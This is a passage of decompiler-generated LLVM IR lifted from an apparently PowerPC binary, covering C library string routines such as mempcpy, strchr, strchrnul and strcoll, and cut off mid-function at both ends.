  %v2_1000f160 = inttoptr i32 %v1_1000f160 to i32*
  %v3_1000f160 = load i32, i32* %v2_1000f160, align 4
  store i32 %v3_1000f160, i32* %r9.global-to-local, align 4
  store i32 %v1_1000f160, i32* %r4.global-to-local, align 4
  %v2_1000f164 = add i32 %v1_1000f164, 4
  %v3_1000f164 = inttoptr i32 %v2_1000f164 to i32*
  store i32 %v3_1000f15c, i32* %v3_1000f164, align 4
  %v0_1000f168 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f168 = load i32, i32* @r11, align 4
  %v2_1000f168 = add i32 %v1_1000f168, 8
  %v3_1000f168 = inttoptr i32 %v2_1000f168 to i32*
  store i32 %v0_1000f168, i32* %v3_1000f168, align 4
  store i32 %v2_1000f168, i32* @r11, align 4
  %v0_1000f16c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f16c = add i32 %v0_1000f16c, -1
  store i32 %v1_1000f16c, i32* %ctr.global-to-local, align 4
  %v2_1000f16c = icmp eq i32 %v1_1000f16c, 0
  br i1 %v2_1000f16c, label %dec_label_pc_1000f170, label %dec_label_pc_1000f15c

dec_label_pc_1000f170:                            ; preds = %dec_label_pc_1000f15c, %dec_label_pc_1000f1cc, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1000f1b4, %dec_label_pc_1000f1cc ], [ %.0, %dec_label_pc_1000f15c ]
  %v1_1000f170 = urem i32 %.1, 8
  store i32 %v1_1000f170, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000f170, 4
  br i1 %tmp, label %dec_label_pc_1000f188, label %dec_label_pc_1000f17c

dec_label_pc_1000f17c:                            ; preds = %dec_label_pc_1000f170
  %v0_1000f17c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f17c = add i32 %v0_1000f17c, 4
  %v2_1000f17c = inttoptr i32 %v1_1000f17c to i32*
  %v3_1000f17c = load i32, i32* %v2_1000f17c, align 4
  store i32 %v1_1000f17c, i32* %r4.global-to-local, align 4
  %v1_1000f180 = add nsw i32 %v1_1000f170, -4
  store i32 %v1_1000f180, i32* @r5, align 4
  %v1_1000f184 = load i32, i32* @r11, align 4
  %v2_1000f184 = add i32 %v1_1000f184, 4
  %v3_1000f184 = inttoptr i32 %v2_1000f184 to i32*
  store i32 %v3_1000f17c, i32* %v3_1000f184, align 4
  store i32 %v2_1000f184, i32* @r11, align 4
  %v0_1000f188.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000f188

dec_label_pc_1000f188:                            ; preds = %dec_label_pc_1000f170, %dec_label_pc_1000f17c
  %v0_1000f188 = phi i32 [ %v1_1000f170, %dec_label_pc_1000f170 ], [ %v0_1000f188.pre, %dec_label_pc_1000f17c ]
  %v3_1000f188 = icmp eq i32 %v0_1000f188, 0
  %v0_1000f18c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f188, i32 %v0_1000f18c)
  %v0_1000f190 = load i32, i32* @r5, align 4
  store i32 %v0_1000f190, i32* %ctr.global-to-local, align 4
  %v0_1000f194 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f194 = add i32 %v0_1000f194, 3
  store i32 %v1_1000f194, i32* %r4.global-to-local, align 4
  %v0_1000f198 = load i32, i32* @r11, align 4
  %v1_1000f198 = add i32 %v0_1000f198, 3
  store i32 %v1_1000f198, i32* %r9.global-to-local, align 4
  %v1_1000f19c9 = add i32 %v0_1000f194, 4
  %v2_1000f19c10 = inttoptr i32 %v1_1000f19c9 to i8*
  %v3_1000f19c11 = load i8, i8* %v2_1000f19c10, align 1
  store i32 %v1_1000f19c9, i32* %r4.global-to-local, align 4
  %v3_1000f1a013 = add i32 %v0_1000f198, 4
  %v4_1000f1a014 = inttoptr i32 %v3_1000f1a013 to i8*
  store i8 %v3_1000f19c11, i8* %v4_1000f1a014, align 1
  store i32 %v3_1000f1a013, i32* %r9.global-to-local, align 4
  %v0_1000f1a415 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f1a416 = add i32 %v0_1000f1a415, -1
  store i32 %v1_1000f1a416, i32* %ctr.global-to-local, align 4
  %v2_1000f1a417 = icmp eq i32 %v1_1000f1a416, 0
  br i1 %v2_1000f1a417, label %dec_label_pc_1000f1d8, label %dec_label_pc_1000f19c.dec_label_pc_1000f19c_crit_edge

dec_label_pc_1000f19c.dec_label_pc_1000f19c_crit_edge: ; preds = %dec_label_pc_1000f188, %dec_label_pc_1000f19c.dec_label_pc_1000f19c_crit_edge
  %v3_1000f1a018 = phi i32 [ %v3_1000f1a0, %dec_label_pc_1000f19c.dec_label_pc_1000f19c_crit_edge ], [ %v3_1000f1a013, %dec_label_pc_1000f188 ]
  %v0_1000f19c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f19c = add i32 %v0_1000f19c.pre, 1
  %v2_1000f19c = inttoptr i32 %v1_1000f19c to i8*
  %v3_1000f19c = load i8, i8* %v2_1000f19c, align 1
  store i32 %v1_1000f19c, i32* %r4.global-to-local, align 4
  %v3_1000f1a0 = add i32 %v3_1000f1a018, 1
  %v4_1000f1a0 = inttoptr i32 %v3_1000f1a0 to i8*
  store i8 %v3_1000f19c, i8* %v4_1000f1a0, align 1
  store i32 %v3_1000f1a0, i32* %r9.global-to-local, align 4
  %v0_1000f1a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f1a4 = add i32 %v0_1000f1a4, -1
  store i32 %v1_1000f1a4, i32* %ctr.global-to-local, align 4
  %v2_1000f1a4 = icmp eq i32 %v1_1000f1a4, 0
  br i1 %v2_1000f1a4, label %dec_label_pc_1000f1d8, label %dec_label_pc_1000f19c.dec_label_pc_1000f19c_crit_edge

dec_label_pc_1000f1ac:                            ; preds = %dec_label_pc_1000f150
  %v1_1000f1ac = sub nsw i32 4, %v1_1000f150
  store i32 %v1_1000f1ac, i32* %ctr.global-to-local, align 4
  %v1_1000f1b4 = load i32, i32* @r5, align 4
  %v2_1000f1b4 = sub i32 %v1_1000f1b4, %v1_1000f1ac
  br label %dec_label_pc_1000f1b8

dec_label_pc_1000f1b8:                            ; preds = %dec_label_pc_1000f1b8.dec_label_pc_1000f1b8_crit_edge, %dec_label_pc_1000f1ac
  %v2_1000f1c0 = phi i32 [ %v1_1000f1c4, %dec_label_pc_1000f1b8.dec_label_pc_1000f1b8_crit_edge ], [ %v1_1000f148, %dec_label_pc_1000f1ac ]
  %v0_1000f1b8 = phi i32 [ %v0_1000f1b8.pre, %dec_label_pc_1000f1b8.dec_label_pc_1000f1b8_crit_edge ], [ %v1_1000f144, %dec_label_pc_1000f1ac ]
  %v1_1000f1b8 = add i32 %v0_1000f1b8, 4
  %v2_1000f1b8 = inttoptr i32 %v1_1000f1b8 to i8*
  %v3_1000f1b8 = load i8, i8* %v2_1000f1b8, align 1
  %v1_1000f1bc = add i32 %v0_1000f1b8, 1
  store i32 %v1_1000f1bc, i32* %r4.global-to-local, align 4
  %v3_1000f1c0 = add i32 %v2_1000f1c0, 4
  %v4_1000f1c0 = inttoptr i32 %v3_1000f1c0 to i8*
  store i8 %v3_1000f1b8, i8* %v4_1000f1c0, align 1
  %v0_1000f1c4 = load i32, i32* @r11, align 4
  %v1_1000f1c4 = add i32 %v0_1000f1c4, 1
  store i32 %v1_1000f1c4, i32* @r11, align 4
  %v0_1000f1c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f1c8 = add i32 %v0_1000f1c8, -1
  store i32 %v1_1000f1c8, i32* %ctr.global-to-local, align 4
  %v2_1000f1c8 = icmp eq i32 %v1_1000f1c8, 0
  br i1 %v2_1000f1c8, label %dec_label_pc_1000f1cc, label %dec_label_pc_1000f1b8.dec_label_pc_1000f1b8_crit_edge

dec_label_pc_1000f1b8.dec_label_pc_1000f1b8_crit_edge: ; preds = %dec_label_pc_1000f1b8
  %v0_1000f1b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f1b8

dec_label_pc_1000f1cc:                            ; preds = %dec_label_pc_1000f1b8
  %v1_1000f1cc = call i32 @__asm_rlwinm.(i32 %v2_1000f1b4, i32 29, i32 3, i32 31)
  store i32 %v1_1000f1cc, i32* %r9.global-to-local, align 4
  %v4_1000f1cc = icmp eq i32 %v1_1000f1cc, 0
  store i1 %v4_1000f1cc, i1* @cr0_eq, align 1
  br i1 %v4_1000f1cc, label %dec_label_pc_1000f170, label %dec_label_pc_1000f1cc.dec_label_pc_1000f158_crit_edge

dec_label_pc_1000f1cc.dec_label_pc_1000f158_crit_edge: ; preds = %dec_label_pc_1000f1cc
  %v1_1000f164.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000f158

dec_label_pc_1000f1d8:                            ; preds = %dec_label_pc_1000f19c.dec_label_pc_1000f19c_crit_edge, %dec_label_pc_1000f188
  %v0_1000f1d8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f1d8

; uselistorder directives
  uselistorder i32 %v1_1000f1cc, { 1, 2, 0 }
  uselistorder i32 %v1_1000f1c8, { 1, 0 }
  uselistorder i32 %v1_1000f1c4, { 1, 0 }
  uselistorder i32 %v0_1000f1b8, { 1, 0 }
  uselistorder i32 %v2_1000f1b4, { 2, 1, 0 }
  uselistorder i32 %v1_1000f1a4, { 1, 0 }
  uselistorder i32 %v3_1000f1a0, { 1, 2, 0 }
  uselistorder i32 %v1_1000f170, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000f16c, { 1, 0 }
  uselistorder i32 %v2_1000f168, { 1, 2, 0 }
  uselistorder i32 %v1_1000f150, { 1, 0 }
  uselistorder i32 %v1_1000f148, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 undef, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 4, 5, 6, 7, 2, 3, 0, 1 }
  uselistorder i32 29, { 46, 47, 48, 49, 72, 0, 73, 71, 56, 57, 58, 59, 60, 61, 62, 55, 51, 52, 53, 54, 50, 63, 64, 65, 66, 67, 68, 69, 70, 7, 8, 9, 10, 11, 12, 74, 75, 34, 35, 2, 3, 1, 13, 14, 15, 16, 4, 5, 6, 17, 18, 21, 19, 20, 22, 23, 24, 25, 28, 29, 30, 31, 26, 27, 32, 33, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder label %dec_label_pc_1000f19c.dec_label_pc_1000f19c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000f188, { 1, 0 }
  uselistorder label %dec_label_pc_1000f170, { 1, 0, 2 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268497400, i32* @lr, align 4
  %v0_1000f1f4 = call i32 @memcpy()
  %v0_1000f1fc = load i32, i32* @r28, align 4
  %v1_1000f1fc = load i32, i32* @r29, align 4
  %v2_1000f1fc = add i32 %v1_1000f1fc, %v0_1000f1fc
  ret i32 %v2_1000f1fc
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000f210 = urem i32 %arg1, 256
  store i32 %v1_1000f210, i32* @r4, align 4
  %v0_1000f2302 = load i32, i32* @r3, align 4
  %v1_1000f2303 = urem i32 %v0_1000f2302, 4
  %v3_1000f2305 = icmp eq i32 %v1_1000f2303, 0
  br i1 %v3_1000f2305, label %dec_label_pc_1000f238, label %dec_label_pc_1000f218

dec_label_pc_1000f218:                            ; preds = %entry, %dec_label_pc_1000f22c
  %v1_1000f21c = phi i32 [ %v0_1000f238.pre, %dec_label_pc_1000f22c ], [ %v1_1000f210, %entry ]
  %v0_1000f218 = phi i32 [ %v1_1000f22c, %dec_label_pc_1000f22c ], [ %v0_1000f2302, %entry ]
  %v1_1000f218 = inttoptr i32 %v0_1000f218 to i8*
  %v2_1000f218 = load i8, i8* %v1_1000f218, align 1
  %v3_1000f218 = zext i8 %v2_1000f218 to i32
  store i32 %v3_1000f218, i32* @r0, align 4
  %v4_1000f21c = icmp eq i32 %v3_1000f218, %v1_1000f21c
  %v3_1000f220 = icmp eq i8 %v2_1000f218, 0
  %v0_1000f224 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f21c, i32 %v0_1000f224)
  br i1 %v3_1000f220, label %dec_label_pc_1000f308, label %dec_label_pc_1000f22c

dec_label_pc_1000f22c:                            ; preds = %dec_label_pc_1000f218
  %v0_1000f22c = load i32, i32* @r3, align 4
  %v1_1000f22c = add i32 %v0_1000f22c, 1
  store i32 %v1_1000f22c, i32* @r3, align 4
  %v1_1000f230 = urem i32 %v1_1000f22c, 4
  %v3_1000f230 = icmp eq i32 %v1_1000f230, 0
  %v0_1000f238.pre = load i32, i32* @r4, align 4
  br i1 %v3_1000f230, label %dec_label_pc_1000f238, label %dec_label_pc_1000f218

dec_label_pc_1000f238:                            ; preds = %dec_label_pc_1000f22c, %entry
  %v0_1000f25010 = phi i32 [ %v0_1000f2302, %entry ], [ %v1_1000f22c, %dec_label_pc_1000f22c ]
  %v0_1000f238 = phi i32 [ %v1_1000f210, %entry ], [ %v0_1000f238.pre, %dec_label_pc_1000f22c ]
  %v1_1000f238 = mul i32 %v0_1000f238, 256
  %v2_1000f240 = or i32 %v1_1000f238, %v0_1000f238
  %v1_1000f248 = mul i32 %v2_1000f240, 65536
  %v2_1000f24c = or i32 %v1_1000f248, %v2_1000f240
  br label %dec_label_pc_1000f250

dec_label_pc_1000f250:                            ; preds = %dec_label_pc_1000f250, %dec_label_pc_1000f304, %dec_label_pc_1000f238
  %v0_1000f2a8 = phi i32 [ %v0_1000f25010, %dec_label_pc_1000f238 ], [ %v1_1000f254, %dec_label_pc_1000f304 ], [ %v1_1000f254, %dec_label_pc_1000f250 ]
  %v1_1000f250 = inttoptr i32 %v0_1000f2a8 to i32*
  %v2_1000f250 = load i32, i32* %v1_1000f250, align 4
  %v1_1000f254 = add i32 %v0_1000f2a8, 4
  %v2_1000f25c = xor i32 %v2_1000f250, %v2_1000f24c
  %v1_1000f260 = add i32 %v2_1000f250, 2130640639
  %v2_1000f268 = xor i32 %v1_1000f260, %v2_1000f250
  %v1_1000f26c = add i32 %v2_1000f25c, 2130640639
  %v2_1000f270 = and i32 %v2_1000f268, -2130640640
  %v3_1000f270 = xor i32 %v2_1000f270, -2130640640
  %v2_1000f274 = xor i32 %v1_1000f26c, %v2_1000f25c
  %v2_1000f278 = and i32 %v2_1000f274, -2130640640
  %v3_1000f278 = xor i32 %v2_1000f278, -2130640640
  store i32 %v0_1000f2a8, i32* @r9, align 4
  %v1_1000f284 = add i32 %v0_1000f2a8, 1
  store i32 %v1_1000f284, i32* @r11, align 4
  %tmp = or i32 %v3_1000f278, %v3_1000f270
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000f250, label %dec_label_pc_1000f290

dec_label_pc_1000f290:                            ; preds = %dec_label_pc_1000f250
  %v2_1000f290 = inttoptr i32 %v0_1000f2a8 to i8*
  %v3_1000f290 = load i8, i8* %v2_1000f290, align 1
  %v4_1000f290 = zext i8 %v3_1000f290 to i32
  store i32 %v4_1000f290, i32* @r0, align 4
  %v1_1000f294 = add i32 %v0_1000f2a8, 2
  %v1_1000f298 = add i32 %v0_1000f2a8, 3
  %v4_1000f29c = icmp eq i32 %v4_1000f290, %v0_1000f238
  br i1 %v4_1000f29c, label %dec_label_pc_1000f2a8, label %dec_label_pc_1000f2b0

dec_label_pc_1000f2a8:                            ; preds = %dec_label_pc_1000f290
  ret i32 %v0_1000f2a8

dec_label_pc_1000f2b0:                            ; preds = %dec_label_pc_1000f290
  %v3_1000f2a0 = icmp eq i8 %v3_1000f290, 0
  br i1 %v3_1000f2a0, label %dec_label_pc_1000f308, label %dec_label_pc_1000f2b4

dec_label_pc_1000f2b4:                            ; preds = %dec_label_pc_1000f2b0
  %v2_1000f2b4 = inttoptr i32 %v1_1000f284 to i8*
  %v3_1000f2b4 = load i8, i8* %v2_1000f2b4, align 1
  %v4_1000f2b4 = zext i8 %v3_1000f2b4 to i32
  store i32 %v4_1000f2b4, i32* @r0, align 4
  %v4_1000f2b8 = icmp eq i32 %v4_1000f2b4, %v0_1000f238
  br i1 %v4_1000f2b8, label %dec_label_pc_1000f2c4, label %dec_label_pc_1000f2cc

dec_label_pc_1000f2c4:                            ; preds = %dec_label_pc_1000f2b4
  ret i32 %v1_1000f284

dec_label_pc_1000f2cc:                            ; preds = %dec_label_pc_1000f2b4
  %v3_1000f2bc = icmp eq i8 %v3_1000f2b4, 0
  br i1 %v3_1000f2bc, label %dec_label_pc_1000f308, label %dec_label_pc_1000f2d0

dec_label_pc_1000f2d0:                            ; preds = %dec_label_pc_1000f2cc
  %v2_1000f2d0 = inttoptr i32 %v1_1000f294 to i8*
  %v3_1000f2d0 = load i8, i8* %v2_1000f2d0, align 1
  %v4_1000f2d0 = zext i8 %v3_1000f2d0 to i32
  store i32 %v4_1000f2d0, i32* @r0, align 4
  %v4_1000f2d4 = icmp eq i32 %v4_1000f2d0, %v0_1000f238
  br i1 %v4_1000f2d4, label %dec_label_pc_1000f2e0, label %dec_label_pc_1000f2e8

dec_label_pc_1000f2e0:                            ; preds = %dec_label_pc_1000f2d0
  ret i32 %v1_1000f294

dec_label_pc_1000f2e8:                            ; preds = %dec_label_pc_1000f2d0
  %v3_1000f2d8 = icmp eq i8 %v3_1000f2d0, 0
  br i1 %v3_1000f2d8, label %dec_label_pc_1000f308, label %dec_label_pc_1000f2ec

dec_label_pc_1000f2ec:                            ; preds = %dec_label_pc_1000f2e8
  %v2_1000f2ec = inttoptr i32 %v1_1000f298 to i8*
  %v3_1000f2ec = load i8, i8* %v2_1000f2ec, align 1
  %v4_1000f2ec = zext i8 %v3_1000f2ec to i32
  store i32 %v4_1000f2ec, i32* @r0, align 4
  %v4_1000f2f0 = icmp eq i32 %v4_1000f2ec, %v0_1000f238
  br i1 %v4_1000f2f0, label %dec_label_pc_1000f2fc, label %dec_label_pc_1000f304

dec_label_pc_1000f2fc:                            ; preds = %dec_label_pc_1000f2ec
  ret i32 %v1_1000f298

dec_label_pc_1000f304:                            ; preds = %dec_label_pc_1000f2ec
  %v3_1000f2f4 = icmp eq i8 %v3_1000f2ec, 0
  br i1 %v3_1000f2f4, label %dec_label_pc_1000f308, label %dec_label_pc_1000f250

dec_label_pc_1000f308:                            ; preds = %dec_label_pc_1000f218, %dec_label_pc_1000f304, %dec_label_pc_1000f2e8, %dec_label_pc_1000f2cc, %dec_label_pc_1000f2b0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000f254, { 1, 0 }
  uselistorder i32 %v2_1000f250, { 0, 2, 1 }
  uselistorder i32 %v0_1000f2a8, { 0, 1, 2, 4, 3, 5, 7, 6 }
  uselistorder i32 %v2_1000f240, { 1, 0 }
  uselistorder i32 %v0_1000f238, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000f22c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000f2302, { 2, 1, 0 }
  uselistorder i32 %v1_1000f210, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f308, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000f250, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f218, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1000f310 = urem i32 %arg1, 256
  store i32 %v1_1000f310, i32* @r4, align 4
  %v0_1000f3304 = load i32, i32* @r3, align 4
  %v1_1000f3305 = urem i32 %v0_1000f3304, 4
  %v3_1000f3307 = icmp eq i32 %v1_1000f3305, 0
  br i1 %v3_1000f3307, label %dec_label_pc_1000f338, label %dec_label_pc_1000f318

dec_label_pc_1000f318:                            ; preds = %entry, %dec_label_pc_1000f318
  %v1_1000f31c = phi i32 [ %v0_1000f338.pre, %dec_label_pc_1000f318 ], [ %v1_1000f310, %entry ]
  %v0_1000f318 = phi i32 [ %v1_1000f32c, %dec_label_pc_1000f318 ], [ %v0_1000f3304, %entry ]
  %v1_1000f318 = inttoptr i32 %v0_1000f318 to i8*
  %v2_1000f318 = load i8, i8* %v1_1000f318, align 1
  %v3_1000f318 = zext i8 %v2_1000f318 to i32
  %v4_1000f31c = icmp eq i32 %v3_1000f318, %v1_1000f31c
  %v3_1000f320 = icmp eq i8 %v2_1000f318, 0
  %v0_1000f324 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f31c, i32 %v0_1000f324)
  %v0_1000f328 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f320, i32 %v0_1000f328)
  %v0_1000f32c = load i32, i32* @r3, align 4
  %v1_1000f32c = add i32 %v0_1000f32c, 1
  store i32 %v1_1000f32c, i32* @r3, align 4
  %v1_1000f330 = urem i32 %v1_1000f32c, 4
  %v3_1000f330 = icmp eq i32 %v1_1000f330, 0
  %v0_1000f338.pre = load i32, i32* @r4, align 4
  br i1 %v3_1000f330, label %dec_label_pc_1000f338, label %dec_label_pc_1000f318

dec_label_pc_1000f338:                            ; preds = %dec_label_pc_1000f318, %entry
  %v0_1000f35012 = phi i32 [ %v0_1000f3304, %entry ], [ %v1_1000f32c, %dec_label_pc_1000f318 ]
  %v0_1000f338 = phi i32 [ %v1_1000f310, %entry ], [ %v0_1000f338.pre, %dec_label_pc_1000f318 ]
  %v1_1000f338 = mul i32 %v0_1000f338, 256
  %v2_1000f340 = or i32 %v1_1000f338, %v0_1000f338
  %v1_1000f348 = mul i32 %v2_1000f340, 65536
  %v2_1000f34c = or i32 %v1_1000f348, %v2_1000f340
  br label %dec_label_pc_1000f350

dec_label_pc_1000f350:                            ; preds = %dec_label_pc_1000f350, %dec_label_pc_1000f3ec, %dec_label_pc_1000f338
  %v0_1000f3ac = phi i32 [ %v0_1000f35012, %dec_label_pc_1000f338 ], [ %v1_1000f354, %dec_label_pc_1000f3ec ], [ %v1_1000f354, %dec_label_pc_1000f350 ]
  %v1_1000f350 = inttoptr i32 %v0_1000f3ac to i32*
  %v2_1000f350 = load i32, i32* %v1_1000f350, align 4
  %v1_1000f354 = add i32 %v0_1000f3ac, 4
  %v2_1000f35c = xor i32 %v2_1000f350, %v2_1000f34c
  %v1_1000f360 = add i32 %v2_1000f350, 2130640639
  %v2_1000f368 = xor i32 %v1_1000f360, %v2_1000f350
  %v1_1000f36c = add i32 %v2_1000f35c, 2130640639
  %v2_1000f370 = and i32 %v2_1000f368, -2130640640
  %v3_1000f370 = xor i32 %v2_1000f370, -2130640640
  %v2_1000f374 = xor i32 %v1_1000f36c, %v2_1000f35c
  %v2_1000f378 = and i32 %v2_1000f374, -2130640640
  %v3_1000f378 = xor i32 %v2_1000f378, -2130640640
  %v1_1000f384 = add i32 %v0_1000f3ac, 1
  store i32 %v1_1000f384, i32* @r11, align 4
  %tmp = or i32 %v3_1000f378, %v3_1000f370
  %brmerge18 = icmp eq i32 %tmp, 0
  br i1 %brmerge18, label %dec_label_pc_1000f350, label %dec_label_pc_1000f390

dec_label_pc_1000f390:                            ; preds = %dec_label_pc_1000f350
  %v2_1000f390 = inttoptr i32 %v0_1000f3ac to i8*
  %v3_1000f390 = load i8, i8* %v2_1000f390, align 1
  %v4_1000f390 = zext i8 %v3_1000f390 to i32
  %v1_1000f394 = add i32 %v0_1000f3ac, 2
  %v1_1000f398 = add i32 %v0_1000f3ac, 3
  %v4_1000f39c = icmp eq i32 %v4_1000f390, %v0_1000f338
  %v3_1000f3a0 = icmp eq i8 %v3_1000f390, 0
  %brmerge = or i1 %v3_1000f3a0, %v4_1000f39c
  br i1 %brmerge, label %dec_label_pc_1000f3ac, label %dec_label_pc_1000f3b4

dec_label_pc_1000f3ac:                            ; preds = %dec_label_pc_1000f390
  ret i32 %v0_1000f3ac

dec_label_pc_1000f3b4:                            ; preds = %dec_label_pc_1000f390
  %v2_1000f3b4 = inttoptr i32 %v1_1000f384 to i8*
  %v3_1000f3b4 = load i8, i8* %v2_1000f3b4, align 1
  %v4_1000f3b4 = zext i8 %v3_1000f3b4 to i32
  %v4_1000f3b8 = icmp eq i32 %v4_1000f3b4, %v0_1000f338
  %v3_1000f3bc = icmp eq i8 %v3_1000f3b4, 0
  %brmerge1 = or i1 %v3_1000f3bc, %v4_1000f3b8
  br i1 %brmerge1, label %dec_label_pc_1000f3c8, label %dec_label_pc_1000f3d0

dec_label_pc_1000f3c8:                            ; preds = %dec_label_pc_1000f3b4
  ret i32 %v1_1000f384

dec_label_pc_1000f3d0:                            ; preds = %dec_label_pc_1000f3b4
  %v2_1000f3d0 = inttoptr i32 %v1_1000f394 to i8*
  %v3_1000f3d0 = load i8, i8* %v2_1000f3d0, align 1
  %v4_1000f3d0 = zext i8 %v3_1000f3d0 to i32
  %v4_1000f3d4 = icmp eq i32 %v4_1000f3d0, %v0_1000f338
  %v3_1000f3d8 = icmp eq i8 %v3_1000f3d0, 0
  %brmerge2 = or i1 %v3_1000f3d8, %v4_1000f3d4
  br i1 %brmerge2, label %dec_label_pc_1000f3e4, label %dec_label_pc_1000f3ec

dec_label_pc_1000f3e4:                            ; preds = %dec_label_pc_1000f3d0
  ret i32 %v1_1000f394

dec_label_pc_1000f3ec:                            ; preds = %dec_label_pc_1000f3d0
  %v2_1000f3ec = inttoptr i32 %v1_1000f398 to i8*
  %v3_1000f3ec = load i8, i8* %v2_1000f3ec, align 1
  %v4_1000f3ec = zext i8 %v3_1000f3ec to i32
  %v4_1000f3f0 = icmp eq i32 %v4_1000f3ec, %v0_1000f338
  %v3_1000f3f4 = icmp eq i8 %v3_1000f3ec, 0
  %brmerge3 = or i1 %v3_1000f3f4, %v4_1000f3f0
  br i1 %brmerge3, label %dec_label_pc_1000f400, label %dec_label_pc_1000f350

dec_label_pc_1000f400:                            ; preds = %dec_label_pc_1000f3ec
  ret i32 %v1_1000f398

; uselistorder directives
  uselistorder i32 %v1_1000f354, { 1, 0 }
  uselistorder i32 %v2_1000f350, { 0, 2, 1 }
  uselistorder i32 %v0_1000f3ac, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000f340, { 1, 0 }
  uselistorder i32 %v0_1000f338, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000f32c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000f3304, { 2, 1, 0 }
  uselistorder i32 %v1_1000f310, { 1, 2, 0 }
  uselistorder i32 65536, { 0, 1, 66, 65, 62, 63, 67, 64, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder label %dec_label_pc_1000f350, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f318, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000f414.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000f40c

dec_label_pc_1000f40c:                            ; preds = %dec_label_pc_1000f430, %entry
  %v0_1000f414 = phi i32 [ %v1_1000f418, %dec_label_pc_1000f430 ], [ %v0_1000f414.pre, %entry ]
  %v0_1000f40c = phi i32 [ %v1_1000f410, %dec_label_pc_1000f430 ], [ %tmp, %entry ]
  %v1_1000f40c = inttoptr i32 %v0_1000f40c to i8*
  %v2_1000f40c = load i8, i8* %v1_1000f40c, align 1
  %v3_1000f40c = zext i8 %v2_1000f40c to i32
  %v1_1000f410 = add i32 %v0_1000f40c, 1
  store i32 %v1_1000f410, i32* @r9, align 4
  %v1_1000f414 = inttoptr i32 %v0_1000f414 to i8*
  %v2_1000f414 = load i8, i8* %v1_1000f414, align 1
  %v3_1000f414 = zext i8 %v2_1000f414 to i32
  %v3_1000f41c = icmp eq i8 %v2_1000f40c, 0
  br i1 %v3_1000f41c, label %dec_label_pc_1000f428, label %dec_label_pc_1000f430

dec_label_pc_1000f428:                            ; preds = %dec_label_pc_1000f40c
  %v1_1000f428 = sub nsw i32 0, %v3_1000f414
  ret i32 %v1_1000f428

dec_label_pc_1000f430:                            ; preds = %dec_label_pc_1000f40c
  %v4_1000f420 = icmp eq i8 %v2_1000f40c, %v2_1000f414
  %v1_1000f418 = add i32 %v0_1000f414, 1
  br i1 %v4_1000f420, label %dec_label_pc_1000f40c, label %dec_label_pc_1000f434

dec_label_pc_1000f434:                            ; preds = %dec_label_pc_1000f430
  %v2_1000f434 = sub nsw i32 %v3_1000f40c, %v3_1000f414
  ret i32 %v2_1000f434

; uselistorder directives
  uselistorder i32 %v3_1000f414, { 1, 0 }
  uselistorder i32 %v1_1000f410, { 1, 0 }
  uselistorder i32 %v0_1000f40c, { 1, 0 }
  uselistorder i32 %v0_1000f414, { 1, 0 }
}

define i32 @strcspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000f44c = load i32, i32* @r4, align 4
  store i32 %v0_1000f44c, i32* @r29, align 4
